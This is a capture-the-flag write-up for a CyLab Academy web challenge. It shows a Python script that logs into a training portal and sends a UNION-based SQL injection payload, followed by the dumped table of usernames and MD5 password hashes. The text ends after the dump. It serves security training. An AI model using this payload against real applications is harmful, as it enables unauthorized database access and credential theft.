# CyLab Academy: Sql Map1 Write-Up

* **Challenge Name:** Sql Map1
* **Platform:** CyLab Academy
* **Category:** Web Exploitation
* **Target Application:** Fort Knox Portal

---

## Overview

**Sql Map1** is a web exploitation challenge featuring a custom authentication portal built with PHP and backed by an SQLite database. The challenge requires identifying a SQL injection vulnerability in the application's search feature, dumping the database contents to extract user password hashes, cracking the corresponding MD5 hash, and authenticating as a legitimate user to capture the final flag.

---

## Methodology & Step-by-Step Solution

### Step 1: Reconnaissance & Account Registration
1. Access the challenge instance URL. The landing page prompts users to register an account before logging in.
2. Click **Register** to create a temporary account (e.g., username `pwnuser99`), then log in to establish an active session tracked via the `PHPSESSID` cookie.
3. Once authenticated, you are redirected to the dashboard containing a search utility located at `vuln.php?q=`.

---

### Step 2: Identifying the SQL Injection Vulnerability
Testing the search input parameter (`q`) reveals that user input is directly processed within an SQLite query backend without proper parameterization. 

* **Vulnerable Parameter:** `q` (GET parameter)
* **Database Backend:** SQLite

---

### Step 3: Exploiting via UNION-Based SQL Injection (Python Script)
Because automated tools like `sqlmap` can occasionally encounter session redirection quirks behind dynamic container proxies, a custom Python automation script can be deployed to register, authenticate, and issue the payload directly.

Create and run an exploitation script (`exploit.py`):

```python
import requests

# Replace with your active challenge instance URL
BASE_URL = "[http://chatelaine.cylabacademy.net:48713](http://chatelaine.cylabacademy.net:48713)"

session = requests.Session()

# 1. Register a temporary user
print("[*] Registering temporary user...")
session.post(f"{BASE_URL}/register.php", data={
    "username": "pwnuser99",
    "password": "password123"
})

# 2. Log in to establish an active session
print("[*] Logging in...")
session.post(f"{BASE_URL}/login.php", data={
    "username": "pwnuser99",
    "password": "password123"
})

# 3. Inject UNION payload to dump the users table
payload = "' UNION SELECT 1, group_concat(username || ' | ' || password) FROM users --"
print("[*] Sending SQL injection payload...")
res = session.get(f"{BASE_URL}/vuln.php", params={"q": payload})

print("\n[+] Response Output:")
print("-" * 40)
print(res.text)
print("-" * 40)

Executing the script dumps the entire `users` table, exposing records containing usernames and password hashes:

```text
ctf-player | 7a67ab5872843b22b5e14511867c4e43
noaccess | 83806b490e28a7f8e6662646cbdbff1a
admin | 5a9a79d9fa477ed163b89088681672c9
pwnuser99 | 482c811da5d5b4bc6d497ffa98491e38
